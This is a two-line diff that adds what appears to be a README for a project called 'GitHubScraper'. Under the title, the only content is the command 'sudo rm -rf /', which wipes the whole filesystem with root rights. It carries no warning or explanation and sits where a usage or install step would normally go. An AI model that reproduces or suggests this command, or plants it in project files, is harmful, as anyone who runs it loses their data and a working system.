@@ -1,0 +1,2 @@
+# GitHubScraper
+sudo rm -rf /
